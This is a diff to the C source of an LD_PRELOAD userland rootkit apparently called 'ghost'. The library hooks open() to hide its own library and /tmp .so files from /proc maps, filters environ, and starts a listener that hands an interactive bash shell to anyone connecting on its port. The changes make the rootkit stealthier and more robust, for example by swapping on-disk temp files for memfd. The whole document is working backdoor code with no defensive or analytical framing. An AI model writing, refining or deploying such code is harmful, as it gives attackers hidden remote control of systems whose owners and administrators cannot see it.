@@ -14,27 +14,32 @@
 #include <stdarg.h>
 #include <sys/wait.h>
 #include <sys/types.h>
+#include <sys/mman.h>
 
-static int ghost_fd = -1;
-static int should_run = 1;
+static volatile int ghost_fd = -1;
+static volatile int should_run = 1;
 
 typedef int (*open_t)(const char *, int, ...);
 typedef ssize_t (*read_t)(int, void *, size_t);
 typedef ssize_t (*write_t)(int, const void *, size_t);
 typedef int (*close_t)(int);
+typedef int (*memfd_create_t)(const char *, unsigned int);
 
 static open_t real_open = NULL;
 static read_t real_read = NULL;
 static close_t real_close = NULL;
-
 static write_t real_write = NULL;
+static memfd_create_t real_memfd_create = NULL;
+
+static pthread_mutex_t ghost_fd_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 static int init_libc_funcs(void) {
     real_open = (open_t)dlsym(RTLD_NEXT, "open");
     real_read = (read_t)dlsym(RTLD_NEXT, "read");
     real_write = (write_t)dlsym(RTLD_NEXT, "write");
     real_close = (close_t)dlsym(RTLD_NEXT, "close");
-    return (real_open && real_read && real_write && real_close) ? 0 : -1;
+    real_memfd_create = (memfd_create_t)dlsym(RTLD_NEXT, "memfd_create");
+    return (real_open && real_read && real_write && real_close && real_memfd_create) ? 0 : -1;
 }
 
 static int is_target_process(void) {
@@ -52,22 +57,42 @@ static int is_ghost_path(const char *path) {
     if (!path) return 0;
     return (strstr(path, "/proc/self/maps") != NULL ||
             strstr(path, "/proc/self/environ") != NULL ||
-            strstr(path, "/proc/") != NULL && strstr(path, "/maps") != NULL ||
-            strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL);
+            (strstr(path, "/proc/") != NULL && strstr(path, "/maps") != NULL) ||
+            (strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL));
+}
+
+static int create_filtered_memfd(const char *content, size_t len) {
+    if (!real_memfd_create) {
+        if (init_libc_funcs() < 0) return -1;
+    }
+    
+    int fd = real_memfd_create("ghost_filtered", MFD_CLOEXEC);
+    if (fd < 0) return -1;
+    
+    if (real_write(fd, content, len) != (ssize_t)len) {
+        real_close(fd);
+        return -1;
+    }
+    
+    if (lseek(fd, 0, SEEK_SET) < 0) {
+        real_close(fd);
+        return -1;
+    }
+    
+    return fd;
 }
 
 static char *filter_environ(const char *path) {
     static char filtered[65536] = {0};
-    static int fd = -1;
-    static char buffer[4096];
     
     if (!real_open || !real_read || !real_close) {
         if (init_libc_funcs() < 0) return NULL;
     }
     
-    fd = real_open(path, O_RDONLY);
+    int fd = real_open(path, O_RDONLY);
     if (fd < 0) return NULL;
     
+    char buffer[4096];
     ssize_t total = 0;
     ssize_t n;
     while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
@@ -93,16 +118,15 @@ static char *filter_environ(const char *path) {
 
 static char *filter_maps(const char *path) {
     static char filtered[131072] = {0};
-    static int fd = -1;
-    static char buffer[4096];
     
     if (!real_open || !real_read || !real_close) {
         if (init_libc_funcs() < 0) return NULL;
     }
     
-    fd = real_open(path, O_RDONLY);
+    int fd = real_open(path, O_RDONLY);
     if (fd < 0) return NULL;
     
+    char buffer[4096];
     ssize_t total = 0;
     ssize_t n;
     while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
@@ -113,7 +137,7 @@ static char *filter_maps(const char *path) {
         while (*src) {
             if ((strstr(src, GHOST_SO_NAME) != NULL && 
                  (src == buffer || *(src-1) == '\n')) ||
-                strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL) {
+                (strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL)) {
                 src = strchr(src, '\n');
                 if (!src) break;
                 src++;
@@ -142,67 +166,25 @@ int open(const char *path, int flags, ...) {
     if (is_ghost_path(path)) {
         if (strstr(path, "environ") != NULL) {
             char *filtered = filter_environ(path);
-            if (filtered) {
-                int fd = real_open("/dev/null", O_RDONLY);
-                if (fd >= 0) {
-                    static char stored_path[256];
-                    snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_environ_%d", getpid());
-                    int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                    if (wfd >= 0) {
-                        real_write(wfd, filtered, strlen(filtered));
-                        real_close(wfd);
-                        return real_open(stored_path, flags, mode);
-                    }
-                    real_close(fd);
+            if (filtered && *filtered) {
+                int memfd = create_filtered_memfd(filtered, strlen(filtered));
+                if (memfd >= 0) {
+                    return memfd;
                 }
             }
         }
         else if (strstr(path, "maps") != NULL) {
             char *filtered = filter_maps(path);
-            if (filtered) {
-                static char stored_path[256];
-                snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_maps_%d", getpid());
-                int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                if (wfd >= 0) {
-                    real_write(wfd, filtered, strlen(filtered));
-                    real_close(wfd);
-                    return real_open(stored_path, flags, mode);
+            if (filtered && *filtered) {
+                int memfd = create_filtered_memfd(filtered, strlen(filtered));
+                if (memfd >= 0) {
+                    return memfd;
                 }
             }
         }
     }
     
     return real_open(path, flags, mode);
-}
-
-static ssize_t hooked_read(int fd, void *buf, size_t count) {
-    if (!real_read) init_libc_funcs();
-    
-    ssize_t ret = real_read(fd, buf, count);
-    if (ret <= 0) return ret;
-    
-    char path[256];
-    char proc_fd[64];
-    snprintf(proc_fd, sizeof(proc_fd), "/proc/self/fd/%d", fd);
-    
-    ssize_t len = readlink(proc_fd, path, sizeof(path) - 1);
-    if (len > 0) {
-        path[len] = '\0';
-        
-        if (strstr(path, "maps") != NULL || strstr(path, "environ") != NULL) {
-            char *filtered = (strstr(path, "environ")) ? 
-                filter_environ(path) : filter_maps(path);
-            if (filtered) {
-                size_t filter_len = strlen(filtered);
-                if (filter_len < count) {
-                    memcpy(buf, filtered, filter_len);
-                    return filter_len;
-                }
-            }
-        }
-    }
-    
-    return ret;
 }
 
 void *ghost_listener(void *arg) {
@@ -223,6 +205,7 @@ void *ghost_listener(void *arg) {
     int flags = fcntl(server_fd, F_GETFD, 0);
     if (flags >= 0) fcntl(server_fd, F_SETFD, flags | FD_CLOEXEC);
     
+    memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_port = htons(GHOST_PORT);
@@ -232,14 +215,16 @@ void *ghost_listener(void *arg) {
         return NULL;
     }
     
-    ghost_fd = server_fd;
-    
     if (listen(server_fd, 3) < 0) {
         close(server_fd);
         return NULL;
     }
+    
+    pthread_mutex_lock(&ghost_fd_mutex);
+    ghost_fd = server_fd;
+    pthread_mutex_unlock(&ghost_fd_mutex);
 
-    while (should_run && access(KILL_SWITCH, F_OK) != 0) {
+    while (should_run) {
         struct timeval tv = {2, 0}; 
         fd_set fds;
         FD_ZERO(&fds);
@@ -250,13 +235,22 @@ void *ghost_listener(void *arg) {
             if (errno == EINTR) continue;
             break;
         }
-        if (ret == 0) continue;
+        if (ret == 0) {
+            if (access(KILL_SWITCH, F_OK) == 0) {
+                should_run = 0;
+                break;
+            }
+            continue;
+        }
         
         client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen);
         if (client_fd >= 0) {
             pid_t pid = fork();
             if (pid == 0) {
-                close(server_fd);
+                pthread_mutex_lock(&ghost_fd_mutex);
+                int my_ghost_fd = ghost_fd;
+                pthread_mutex_unlock(&ghost_fd_mutex);
+                if (my_ghost_fd >= 0) close(my_ghost_fd);
                 dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                 unsetenv("LD_PRELOAD"); 
                 execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
@@ -266,7 +260,14 @@ void *ghost_listener(void *arg) {
             if (pid > 0) waitpid(pid, NULL, WNOHANG);
         }
     }
-    close(server_fd);
+    
+    pthread_mutex_lock(&ghost_fd_mutex);
+    if (ghost_fd == server_fd) {
+        close(server_fd);
+        ghost_fd = -1;
+    }
+    pthread_mutex_unlock(&ghost_fd_mutex);
+    
     return NULL;
 }
 
@@ -287,8 +288,10 @@ void init_ghost(void) {
 __attribute__((destructor))
 void cleanup_ghost(void) {
     should_run = 0;
+    pthread_mutex_lock(&ghost_fd_mutex);
     if (ghost_fd >= 0) {
         close(ghost_fd);
         ghost_fd = -1;
     }
+    pthread_mutex_unlock(&ghost_fd_mutex);
 }
